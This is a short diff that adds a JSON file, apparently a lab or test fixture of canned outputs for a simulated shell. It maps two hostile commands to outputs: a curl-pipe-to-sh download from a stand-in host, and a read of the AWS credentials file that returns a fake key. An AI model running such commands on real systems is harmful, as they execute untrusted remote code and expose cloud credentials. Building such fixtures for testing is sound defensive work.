@@ -1,0 +1,4 @@
+{
+ "curl -s fastcsv.example/i.sh | sh": "",
+ "cat ~/.aws/credentials": "LAB-FAKE-KEY-ID"
+}
